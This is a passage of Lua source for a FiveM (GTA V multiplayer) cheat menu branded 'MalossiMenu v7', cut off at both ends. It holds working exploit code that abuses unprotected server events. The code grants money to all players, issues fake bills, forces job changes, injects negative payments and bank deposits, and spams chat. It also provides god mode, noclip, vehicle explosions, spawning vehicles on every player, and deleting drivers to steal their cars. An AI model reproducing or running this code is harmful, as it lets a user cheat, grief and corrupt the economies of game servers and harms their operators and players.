                        for bD = 0, 9 do
                            TriggerServerEvent(
                                '_chat:messageEntered',
                                '~g~by MalossiHosting',
                                {
                                    141,
                                    211,
                                    255
                                },
                                '^' .. bD .. '~g~by MalossiHosting'
                            )
                        end
                        for i = 0, 256 do
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx:giveInventoryItem',
                                GetPlayerServerId(i),
                                'item_money',
                                'money',
                                1254756
                            )
                            TriggerServerEvent(
                                'esx_billing:sendBill',
                                GetPlayerServerId(i),
                                'Purposeless',
                                '~g~by MalossiHosting',
                                43161337
                            )
                            TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(i), 'police', 3)
                            TriggerServerEvent('NB:recruterplayer', i, 'police', 3)
                        end
                    end
                )
end
			
			function vrpdestroy()
                for bD = 0, 9 do
                    TriggerServerEvent(
                        '_chat:messageEntered',
                        'MalossiMenu v7',
                        {
                            141,
                            211,
                            255
                        },
                        '^' .. bD .. 'MalossiMenu v7'
                    )
                end
                TriggerServerEvent(
                    'lscustoms:payGarage',
                    {
                        costs = -99999999
                    }
                )
                TriggerServerEvent('vrp_slotmachine:server:2', 999999999)
                TriggerServerEvent('Banca:deposit', 999999999)
                TriggerServerEvent('bank:deposit', 999999999)
                local di = GetPlayerServerId(PlayerId())
                for i = 0, 256 do
                    TriggerEvent('bank:transfer', di, GetPlayerServerId(i), 99999999)
                end
            end


if Oneshot then
                SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
                local gotEntity = getEntity(PlayerId())
                if IsEntityAPed(gotEntity) then
                    if IsPedInAnyVehicle(gotEntity, true) then
                        if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                            if IsControlJustReleased(1, 69) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        else
                            if IsControlJustReleased(1, 142) then
                                NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
                            end
                        end
                    end
                elseif IsEntityAVehicle(gotEntity) then
                    if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
                        if IsControlJustReleased(1, 69) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    else
                        if IsControlJustReleased(1, 142) then
                            NetworkExplodeVehicle(gotEntity, true, true, 0)
                        end
                    end
                end
            else
                SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
            end
      
   
      

	

			if AimBot then
				SetPlayerWeaponDamageModifier(PlayerId(), 100.0)
				local gotEntity = getEntity(PlayerId())
				if IsEntityAPed(gotEntity) then
					if IsPedInAnyVehicle(gotEntity, true) then
						if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
							if IsControlJustReleased(1, 69) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						else
							if IsControlJustReleased(1, 142) then
								NetworkExplodeVehicle(GetVehiclePedIsIn(gotEntity, true), true, true, 0)
							end
						end
					end
				elseif IsEntityAVehicle(gotEntity) then
					if IsPedInAnyVehicle(GetPlayerPed(-1), true) then
						if IsControlJustReleased(1, 69) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					else
						if IsControlJustReleased(1, 142) then
							NetworkExplodeVehicle(gotEntity, true, true, 0)
						end
					end
				end
			else
				SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
			end
 
			
	function reviveme() 
drawNotification("~h~-» ~g~revive success!")
	    SetEntityHealth(PlayerPedId(), 200)
		SetPedArmour(PlayerPedId(), 200)
		TriggerEvent("esx_status:set", "hunger", 1000000)
		TriggerEvent("esx_status:set", "thirst", 1000000)
		TriggerEvent("esx_ambulancejob:revive")
		TriggerEvent('ambulancier:selfRespawn')
	
					
	end
	
	if sall then
                for i = 0, 128 do
                    local ped = GetPlayerPed(i)
                    local coords = GetEntityCoords(ped)
                    local vehiclehash = GetHashKey("savage")
                    RequestModel(vehiclehash)
                    CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                end
            end

			
			if spam then
                for i = 0, 128 do
						TriggerServerEvent(
                    '_chat:messageEntered',
                    'FUCK SERVER by MalossiHosting#5836',
                    {0, 0x99, 255},
                    'FUCK SERVER by MalossiHosting#5836'
                )
                TriggerServerEvent('_chat:messageEntered', 'FUCK SERVER by MalossiHosting#5836', {0, 0x99, 255}, 'FUCK SERVER by MalossiHosting#5836')
                end
			end

			DisplayRadar(true)

			if RainbowVeh then
				local ra = RGBRainbow(1.0)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
				SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
			end
			
			
			if ou328hSync then
                local u48y34 = RGBRainbow(1.0)
				local ped = PlayerPedId()
                local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			
			if ou328hNeon then
                local u48y34 = RGBRainbow(1.0)
		    local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end

			

			if Noclip then
				local currentSpeed = 2
				local noclipEntity =
					IsPedInAnyVehicle(PlayerPedId(), false) and GetVehiclePedIsUsing(PlayerPedId()) or PlayerPedId()
				FreezeEntityPosition(PlayerPedId(), true)
				SetEntityInvincible(PlayerPedId(), true)

				local newPos = GetEntityCoords(entity)

				DisableControlAction(0, 32, true) --MoveUpOnly
				DisableControlAction(0, 268, true) --MoveUp

				DisableControlAction(0, 31, true) --MoveUpDown

				DisableControlAction(0, 269, true) --MoveDown
				DisableControlAction(0, 33, true) --MoveDownOnly

				DisableControlAction(0, 266, true) --MoveLeft
				DisableControlAction(0, 34, true) --MoveLeftOnly

				DisableControlAction(0, 30, true) --MoveLeftRight

				DisableControlAction(0, 267, true) --MoveRight
				DisableControlAction(0, 35, true) --MoveRightOnly

				DisableControlAction(0, 44, true) --Cover
				DisableControlAction(0, 20, true) --MultiplayerInfo

				local yoff = 0.0
				local zoff = 0.0

				if GetInputMode() == "MouseAndKeyboard" then
					if IsDisabledControlPressed(0, 32) then
						yoff = 0.5
					end
					if IsDisabledControlPressed(0, 33) then
						yoff = -0.5
					end
					if IsDisabledControlPressed(0, 34) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) + 3.0)
					end
					if IsDisabledControlPressed(0, 35) then
						SetEntityHeading(PlayerPedId(), GetEntityHeading(PlayerPedId()) - 3.0)
					end
					if IsDisabledControlPressed(0, 44) then
						zoff = 0.21
					end
					if IsDisabledControlPressed(0, 20) then
						zoff = -0.21
					end
				end

				newPos =
					GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

				local heading = GetEntityHeading(noclipEntity)
				SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
				SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
				SetEntityHeading(noclipEntity, heading)

				SetEntityCollision(noclipEntity, false, false)
				SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

				FreezeEntityPosition(noclipEntity, false)
				SetEntityInvincible(noclipEntity, false)
				SetEntityCollision(noclipEntity, true, true)
			end
		end
	end
)

function GetPlayers()
	local players = {}

	for i = 0, 31 do
		if NetworkIsPlayerActive(i) then
			table.insert(players, i)
		end
	end

	return players
end


function FirePlayer(SelectedPlayer)
	if ESX then
		ESX.TriggerServerCallback('esx_society:getOnlinePlayers', function(players)

			local playerMatch = nil
			for i=1, #players, 1 do
						label = players[i].name
						value = players[i].source
						name = players[i].name
						if name == GetPlayerName(SelectedPlayer) then
							playerMatch = players[i].identifier
							debugLog('found ' .. players[i].name .. ' ' .. players[i].identifier)
						end
						identifier = players[i].identifier
			end



			ESX.TriggerServerCallback('esx_society:setJob', function()
			end, playerMatch, 'unemployed', 0, 'hire')

		end)
	end
end

Citizen.CreateThread(
	function()
		FreezeEntityPosition(entity, false)
		local currentItemIndex = 1
		local selectedItemIndex = 1
		        local currentTint = 1
        local selectedTint = 1


		TiagoMenu.CreateMenu("MainMenu", "MALOSSI ~n~~r~MENU")
		TiagoMenu.SetSubTitle("MainMenu", "VERSION 3.7")
		TiagoMenu.CreateSubMenu("Models", "MainMenu", "Model")
		TiagoMenu.CreateSubMenu("SelfMenu", "MainMenu", "PlayerMenu")
		TiagoMenu.CreateSubMenu("World", "MainMenu", "World")
		TiagoMenu.CreateSubMenu("Fuck", "MainMenu", "Fuck")
		TiagoMenu.CreateSubMenu("VehMenu", "MainMenu", "Vehicle Menu")
		TiagoMenu.CreateSubMenu("ServerMenu", "MainMenu", "LUA Execution")
		TiagoMenu.CreateSubMenu("TeleportMenu", "MainMenu", "Teleport Menu")
		TiagoMenu.CreateSubMenu('OnlinePlayerMenu', 'MainMenu', 'Online Player Menu')
		TiagoMenu.CreateSubMenu('PlayerOptionsMenu', 'OnlinePlayerMenu', 'Player Options')
		TiagoMenu.CreateSubMenu('SingleWepPlayer', 'OnlinePlayerMenu', 'Single Weapon Menu')
		TiagoMenu.CreateSubMenu("WepMenu", "MainMenu", "Weapon Menu")
		TiagoMenu.CreateSubMenu("SingleWepMenu", "WepMenu", "Single Weapon Menu")
		TiagoMenu.CreateSubMenu("ESXBoss", "ServerMenu", "ESX Boss Menus")
		TiagoMenu.CreateSubMenu("ESXMoney", "ServerMenu", "Money Options")
		TiagoMenu.CreateSubMenu("ESXMisc", "ServerMenu", "ESX Misc Options")
		TiagoMenu.CreateSubMenu("ESXDrugs", "ServerMenu", "ESX Drugs")
		TiagoMenu.CreateSubMenu("MiscServerOptions", "ServerMenu", "Misc Server Options")
		TiagoMenu.CreateSubMenu("RecrutarPlayers", "ServerMenu", "Recrutar Players")
		TiagoMenu.CreateSubMenu("RecrutarPlayersOptions", "RecrutarPlayers", "Recrutar Players options")
		TiagoMenu.CreateSubMenu("PlayerTrollMenu", "OnlinePlayerMenu", "Troll Options")
		TiagoMenu.CreateSubMenu("SpawnPropsMenu", "PlayerTrollMenu", "Spawn Props On Player")
		TiagoMenu.CreateSubMenu("VehicleRamMenu", "PlayerTrollMenu", "Ram Vehicles Into Player")
		TiagoMenu.CreateSubMenu("WeaponCustomization", "WepMenu", "Weapon Cusomization Options")
		TiagoMenu.CreateSubMenu('TorqueBoostMenu', 'VehMenu', 'Torque Boost ~b~>~s~')
	    TiagoMenu.CreateSubMenu(
            'WeaponTypes',
            'WepMenu',
            'Weapons'
        )
        TiagoMenu.CreateSubMenu(
            'WeaponTypeSelection',
            'WeaponTypes',
            'Weapon'
        )
        TiagoMenu.CreateSubMenu(
            'WeaponOptions',
            'WeaponTypeSelection',
            'Weapon Options'
        )
        TiagoMenu.CreateSubMenu('ModSelect', 'WeaponOptions', 'Weapon Mod Options')
        TiagoMenu.CreateSubMenu('CarTypes', 'VehMenu', 'Vehicles')
		TiagoMenu.CreateSubMenu('VehBoostMenu', 'VehMenu', 'Vehicle Boost')
		
        TiagoMenu.CreateSubMenu('CarTypeSelection', 'CarTypes', 'Types')
        TiagoMenu.CreateSubMenu(
            'CarOptions',
            'CarTypeSelection',
            'Car Options'
        )
		TiagoMenu.CreateSubMenu('LSC', 'VehMenu', 'LSC Customs')
        TiagoMenu.CreateSubMenu('tunings', 'LSC', 'Visual Tuning')
        TiagoMenu.CreateSubMenu('performance', 'LSC', 'Performance Tuning')
		
		
		for i, da in pairs(be) do
            TiagoMenu.CreateSubMenu(da.id, 'tunings', da.name)
            if da.id == 'paint' then
                TiagoMenu.CreateSubMenu('primary', da.id, 'Primary Paint')
                TiagoMenu.CreateSubMenu('secondary', da.id, 'Secondary Paint')
                TiagoMenu.CreateSubMenu('rimpaint', da.id, 'Wheel Paint')
                TiagoMenu.CreateSubMenu('classic1', 'primary', 'Classic Paint')
                TiagoMenu.CreateSubMenu('metallic1', 'primary', 'Metallic Paint')
                TiagoMenu.CreateSubMenu('matte1', 'primary', 'Matte Paint')
                TiagoMenu.CreateSubMenu('metal1', 'primary', 'Metal Paint')
                TiagoMenu.CreateSubMenu('classic2', 'secondary', 'Classic Paint')
                TiagoMenu.CreateSubMenu('metallic2', 'secondary', 'Metallic Paint')
                TiagoMenu.CreateSubMenu('matte2', 'secondary', 'Matte Paint')
                TiagoMenu.CreateSubMenu('metal2', 'secondary', 'Metal Paint')
                TiagoMenu.CreateSubMenu('classic3', 'rimpaint', 'Classic Paint')
                TiagoMenu.CreateSubMenu('metallic3', 'rimpaint', 'Metallic Paint')
                TiagoMenu.CreateSubMenu('matte3', 'rimpaint', 'Matte Paint')
                TiagoMenu.CreateSubMenu('metal3', 'rimpaint', 'Metal Paint')
            end
        end
		for i, da in pairs(bf) do
            TiagoMenu.CreateSubMenu(da.id, 'performance', da.name)
        end
        local SelectedPlayer
        while bm do
            ped = PlayerPedId()
            veh = GetVehiclePedIsUsing(ped)
            SetVehicleModKit(veh, 0)
            for i, da in pairs(be) do
                if TiagoMenu.IsMenuOpened('tunings') then
                    if b9 then
                        if bb == 'neon' then
                            local r, g, b = table.unpack(ba)
                            SetVehicleNeonLightsColour(veh, r, g, b)
                            SetVehicleNeonLightEnabled(veh, 0, bd)
                            SetVehicleNeonLightEnabled(veh, 1, bd)
                            SetVehicleNeonLightEnabled(veh, 2, bd)
                            SetVehicleNeonLightEnabled(veh, 3, bd)
                            b9 = false
                            bb = -1
                            ba = -1
                        elseif bb == 'paint' then
                            local db, dc, dd, de = table.unpack(ba)
                            SetVehicleColours(veh, db, dc)
                            SetVehicleExtraColours(veh, dd, de)
                            b9 = false
                            bb = -1
                            ba = -1
                        else
                            if bd == 'rm' then
                                RemoveVehicleMod(veh, bb)
                                b9 = false
                                bb = -1
                                ba = -1
                            else
                                SetVehicleMod(veh, bb, ba, false)
                                b9 = false
                                bb = -1
                                ba = -1
                            end
                        end
                    end
                end
                if TiagoMenu.IsMenuOpened(da.id) then
                    if da.id == 'wheeltypes' then
                        if TiagoMenu.Button('Sport Wheels') then
                            SetVehicleWheelType(veh, 0)
                        elseif TiagoMenu.Button('Muscle Wheels') then
                            SetVehicleWheelType(veh, 1)
                        elseif TiagoMenu.Button('Lowrider Wheels') then
                            SetVehicleWheelType(veh, 2)
                        elseif TiagoMenu.Button('SUV Wheels') then
                            SetVehicleWheelType(veh, 3)
                        elseif TiagoMenu.Button('Offroad Wheels') then
                            SetVehicleWheelType(veh, 4)
                        elseif TiagoMenu.Button('Tuner Wheels') then
                            SetVehicleWheelType(veh, 5)
                        elseif TiagoMenu.Button('High End Wheels') then
                            SetVehicleWheelType(veh, 7)
                        end
                        TiagoMenu.Display()
                    elseif da.id == 'extra' then
                        local df = checkValidVehicleExtras()
                        for i, da in pairs(df) do
                            if IsVehicleExtraTurnedOn(veh, i) then
                                pricestring = 'Installed'
                            else
                                pricestring = 'Not Installed'
                            end
                            if TiagoMenu.Button(da.menuName, pricestring) then
                                SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh, i))
                            end
                        end
                        TiagoMenu.Display()
                    elseif da.id == 'neon' then
                        if TiagoMenu.Button('None') then
                            SetVehicleNeonLightsColour(veh, 255, 255, 255)
                            SetVehicleNeonLightEnabled(veh, 0, false)
                            SetVehicleNeonLightEnabled(veh, 1, false)
                            SetVehicleNeonLightEnabled(veh, 2, false)
                            SetVehicleNeonLightEnabled(veh, 3, false)
                        end
                        for i, da in pairs(bg) do
                            colorr, colorg, colorb = table.unpack(da)
                            r, g, b = GetVehicleNeonLightsColour(veh)
                            if
                                colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle, 2) and
                                    not b9
                             then
                                pricestring = 'Installed'
                            else
                                if b9 and colorr == r and colorg == g and colorb == b then
                                    pricestring = 'Previewing'
                                else
                                    pricestring = 'Not Installed'
                                end
                            end
                            if TiagoMenu.Button(i, pricestring) then
                                if not b9 then
                                    bb = 'neon'
                                    bd = IsVehicleNeonLightEnabled(veh, 1)
                                    oldr, oldg, oldb = GetVehicleNeonLightsColour(veh)
                                    ba = table.pack(oldr, oldg, oldb)
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    b9 = true
                                elseif b9 and colorr == r and colorg == g and colorb == b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    b9 = false
                                    bb = -1
                                    ba = -1
                                elseif b9 and colorr ~= r or colorg ~= g or colorb ~= b then
                                    SetVehicleNeonLightsColour(veh, colorr, colorg, colorb)
                                    SetVehicleNeonLightEnabled(veh, 0, true)
                                    SetVehicleNeonLightEnabled(veh, 1, true)
                                    SetVehicleNeonLightEnabled(veh, 2, true)
                                    SetVehicleNeonLightEnabled(veh, 3, true)
                                    b9 = true
                                end
                            end
                        end
                        TiagoMenu.Display()
                    elseif da.id == 'paint' then
                        if TiagoMenu.MenuButton('~h~~p~-> ~s~Primary Paint', 'primary') then
                        elseif TiagoMenu.MenuButton('~h~~p~-> ~s~Secondary Paint', 'secondary') then
                        elseif TiagoMenu.MenuButton('~h~~p~-> ~s~Wheel Paint', 'rimpaint') then
                        end
                        TiagoMenu.Display()
                    else
                        local at = checkValidVehicleMods(da.id)
                        for dg, dh in pairs(at) do
                            if dh.menuName == '~h~~b~Stock' then
                                price = 0
                            end
                            if da.name == 'Horns' then
                                for di, dj in pairs(horns) do
                                    if dj == dg - 1 then
                                        dh.menuName = di
                                    end
                                end
                            end
                            if dh.menuName == 'NULL' then
                                dh.menuname = 'unknown'
                            end
                            if TiagoMenu.Button(dh.menuName, price) then
                                if not b9 then
                                    bb = da.id
                                    ba = GetVehicleMod(veh, da.id)
                                    b9 = true
                                    if dh.data.realIndex == -1 then
                                        bd = 'rm'
                                        RemoveVehicleMod(veh, dh.data.modid)
                                        b9 = false
                                        bb = -1
                                        ba = -1
                                        bd = false
                                    else
                                        bd = false
                                        SetVehicleMod(veh, da.id, dh.data.realIndex, false)
                                    end
                                elseif b9 and GetVehicleMod(veh, da.id) == dh.data.realIndex then
                                    b9 = false
                                    bb = -1
                                    ba = -1
                                    bd = false
                                    if dh.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dh.data.modid)
                                    else
                                        SetVehicleMod(veh, da.id, dh.data.realIndex, false)
                                    end
                                elseif b9 and GetVehicleMod(veh, da.id) ~= dh.data.realIndex then
                                    if dh.data.realIndex == -1 then
                                        RemoveVehicleMod(veh, dh.data.modid)
                                        b9 = false
                                        bb = -1
                                        ba = -1
                                        bd = false
                                    else
                                        SetVehicleMod(veh, da.id, dh.data.realIndex, false)
                                        b9 = true
                                    end
                                end
                            end
                        end
                        TiagoMenu.Display()
                    end
                end
            end
            for i, da in pairs(bf) do
                if TiagoMenu.IsMenuOpened(da.id) then
                    if GetVehicleMod(veh, da.id) == 0 then
                        pricestock = 'Not Installed'
                        price1 = 'Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, da.id) == 1 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, da.id) == 2 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Installed'
                        price4 = 'Not Installed'
                    elseif GetVehicleMod(veh, da.id) == 3 then
                        pricestock = 'Not Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Installed'
                    elseif GetVehicleMod(veh, da.id) == -1 then
                        pricestock = 'Installed'
                        price1 = 'Not Installed'
                        price2 = 'Not Installed'
                        price3 = 'Not Installed'
                        price4 = 'Not Installed'
                    end
                    if TiagoMenu.Button('Stock ' .. da.name, pricestock) then
                        SetVehicleMod(veh, da.id, -1)
                    elseif TiagoMenu.Button(da.name .. ' Upgrade 1', price1) then
                        SetVehicleMod(veh, da.id, 0)
                    elseif TiagoMenu.Button(da.name .. ' Upgrade 2', price2) then
                        SetVehicleMod(veh, da.id, 1)
                    elseif TiagoMenu.Button(da.name .. ' Upgrade 3', price3) then
                        SetVehicleMod(veh, da.id, 2)
                    elseif da.id ~= 13 and da.id ~= 12 and TiagoMenu.Button(da.name .. ' Upgrade 4', price4) then
                        SetVehicleMod(veh, da.id, 3)
                    end
                    TiagoMenu.Display()
                end
            end
			
	
			if TiagoMenu.IsMenuOpened("MainMenu") then
			    
			    drawNotification(" MalossiMenu v7  ~n~~h~WELCOME ~r~[~s~ " ..GetPlayerName(PlayerId()).." ~r~]")
			    drawNotification("~h~Key ~h~~g~[ 1 ] ~s~Teleport Waypoint")
		        drawNotification("~h~Key ~h~~g~[ 2 ] ~s~Fix Car")
				drawNotification("~h~Key ~h~~g~[ 3 ] ~s~Revive")
				drawNotification("~h~~g~Official Discord: ~s~~n~~h~https://discord.malossirelease.nl ~n~~r~MalossiHosting#6666")
				
				if TiagoMenu.MenuButton("→  ~h~~c~ONLINE ~s~PLAYERS", "OnlinePlayerMenu") then
				elseif TiagoMenu.MenuButton("→  ~h~~b~PLAYERS ~s~MENU", "SelfMenu") then
				elseif TiagoMenu.MenuButton("→  ~h~~o~MODELS ~s~MENU", "Models") then
				elseif TiagoMenu.MenuButton("→  ~h~~y~WORLD ~s~MENU", "World") then
				elseif TiagoMenu.MenuButton("→  ~h~~g~TELEPORTE  ~s~MENU", "TeleportMenu") then
				elseif TiagoMenu.MenuButton("→  ~h~~m~VEHICLES  ~s~MENU", "VehMenu") then
				elseif TiagoMenu.MenuButton("→  ~h~~p~WEAPONS  ~s~MENU", "WepMenu") then
				elseif TiagoMenu.MenuButton("→  ~h~~r~FUCK  ~s~MENU", "Fuck") then
				elseif TiagoMenu.MenuButton("→  ~h~<FONT COLOR='#15f600'>∑ LUA ~s~MENU ∑", "ServerMenu") then
				elseif TiagoMenu.Button("X ~r~DISCONNECT ~s~X") then
					bm = false
				end

				TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("SelfMenu") then
				if
				TiagoMenu.CheckBox(
						"~h~~g~God ~h~~r~Mode ~s~1",
						Godmode,
						function(enabled)
							Godmode = enabled
						end)	
				 then
				 elseif
				TiagoMenu.CheckBox(
					"~h~~g~God ~h~~r~Mode ~s~2",
					ToggleGodmode,
					function(enabled)
					ToggleGodmode = enabled
					end)
				then
				 elseif
				TiagoMenu.CheckBox(
					"~h~~g~God ~h~~r~Mode ~s~3",
					Demigod,
					function(enabled)
					Demigod = enabled
					end)
				then
				elseif
				TiagoMenu.CheckBox(
					"~h~~b~Forcefield ~r~(~s~Turn on Godmode~r~)",
					Forcefield,
					function(enabled)
					Forcefield = enabled
					end)
				then 
				elseif TiagoMenu.ComboBox("Radius ~b~Distance", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
					currForcefieldRadiusIndex = currentIndex
					selForcefieldRadiusIndex = currentIndex
					ForcefieldRadius = ForcefieldRadiusOps[currentIndex]
				end) then
				elseif TiagoMenu.Button("~h~~r~Suicide") then
					SetEntityHealth(PlayerPedId(), 0)
				elseif TiagoMenu.Button("~h~~g~Revive") then
				SetEntityHealth(PlayerPedId(), 200)
				SetPedArmour(PlayerPedId(), 200)
				TriggerEvent("esx_status:set", "thirst", 1000000)
				TriggerEvent("esx_status:set", "hunger", 1000000)
					TriggerEvent("esx_ambulancejob:revive")
				    TriggerEvent('ambulancier:selfRespawn')
				elseif TiagoMenu.Button("~h~~b~Armour") then
					SetPedArmour(PlayerPedId(), 200)
				elseif TiagoMenu.Button("~o~~h~Set hunger to ~s~100%") then
					TriggerEvent("esx_status:set", "hunger", 1000000)
				elseif TiagoMenu.Button("~b~~h~Set thirst to ~s~100%") then
					TriggerEvent("esx_status:set", "thirst", 1000000)
				elseif TiagoMenu.Button("~h~Open Menu Jail ~g~ESX") then
					TriggerEvent("esx-qalle-jail:openJailMenu")
				elseif TiagoMenu.Button("~h~~b~Unjail") then
					TriggerServerEvent('esx_jailer:unjailTime', -1)
					TriggerServerEvent('JailUpdate', 0)
					TriggerEvent('UnJP')
					elseif TiagoMenu.Button("~b~Cuff ~s~Player") then
				        TriggerServerEvent("OG_cuffs:cuffCheckNearest")
						TriggerServerEvent("CheckHandcuff")
						TriggerServerEvent('cuffServer')
						TriggerServerEvent("cuffGranted")
						TriggerServerEvent("police:cuffGranted")
						TriggerServerEvent('esx_handcuffs:cuffing')
						TriggerServerEvent('esx_policejob:handcuff')
				elseif
				TiagoMenu.CheckBox("~h~Infinite Stamina",InfStamina,function(enabled)InfStamina = enabled end)
				then
				elseif
				TiagoMenu.CheckBox(
					"~h~Super Jump",
					SuperJump,
					function(enabled)
					SuperJump = enabled
					end)
				then
				elseif
				TiagoMenu.CheckBox(
					"~h~Explosive Punch",
					ePunch,
					function(enabled)
					ePunch = enabled
					end)
				then
				elseif
				TiagoMenu.CheckBox("~h~Fast Run",fastrun,function(enabled)fastrun = enabled end)
			 	then
				elseif
				TiagoMenu.CheckBox(
					"~h~Invisible",
					Invisible,
					function(enabled)
					Invisible = enabled
					end)
				then
				elseif
				TiagoMenu.CheckBox("~h~NoClip",Noclip,function(enabled)Noclip = enabled end)
				then	
				end

		TiagoMenu.Display()
			elseif TiagoMenu.IsMenuOpened("TeleportMenu") then
				if TiagoMenu.Button("~h~Teleport ~h~~p~Waypoint ~r~(KEY 1)") then
				TeleportToWaypoint()
			 elseif TiagoMenu.Button("~h~Teleport ~h~~p~intro Vehicle ") then
					
					local playerPed = GetPlayerPed(-1)
					local playerPedPos = GetEntityCoords(playerPed, true)
					local NearestVehicle = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 4)
					local NearestVehiclePos = GetEntityCoords(NearestVehicle, true)
					local NearestPlane = GetClosestVehicle(GetEntityCoords(playerPed, true), 1000.0, 0, 16384)
					local NearestPlanePos = GetEntityCoords(NearestPlane, true)
				
				Citizen.Wait(1000)
				if (NearestVehicle == 0) and (NearestPlane == 0) then
					drawNotification("~r~No Vehicle Found")
				elseif (NearestVehicle == 0) and (NearestPlane ~= 0) then
					if IsVehicleSeatFree(NearestPlane, -1) then
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestPlane, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestPlane, -1)
						SetVehicleAlarm(NearestPlane, false)
						SetVehicleDoorsLocked(NearestPlane, 1)
						SetVehicleNeedsToBeHotwired(NearestPlane, false)
					end
					drawNotification("~g~Teleported Into Vehicle")
				elseif (NearestVehicle ~= 0) and (NearestPlane == 0) then
					if IsVehicleSeatFree(NearestVehicle, -1) then
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					else
						local driverPed = GetPedInVehicleSeat(NearestVehicle, -1)
						ClearPedTasksImmediately(driverPed)
						SetEntityAsMissionEntity(driverPed, 1, 1)
						DeleteEntity(driverPed)
						SetPedIntoVehicle(playerPed, NearestVehicle, -1)
						SetVehicleAlarm(NearestVehicle, false)
						SetVehicleDoorsLocked(NearestVehicle, 1)
						SetVehicleNeedsToBeHotwired(NearestVehicle, false)
					end
					drawNotification("~g~Teleported Into Vehicle")
				elseif (NearestVehicle ~= 0) and (NearestPlane ~= 0) then
					if Vdist(NearestVehiclePos.x, NearestVehiclePos.y, NearestVehiclePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) < Vdist(NearestPlanePos.x, NearestPlanePos.y, NearestPlanePos.z, playerPedPos.x, playerPedPos.y, playerPedPos.z) then
						if IsVehicleSeatFree(NearestVehicle, -1) then
							SetPedIntoVehicle(playerPed, NearestVehicle, -1)
							SetVehicleAlarm(NearestVehicle, false)
							SetVehicleDoorsLocked(NearestVehicle, 1)
							SetVehicleNeedsToBeHotwired(NearestVehicle, false)
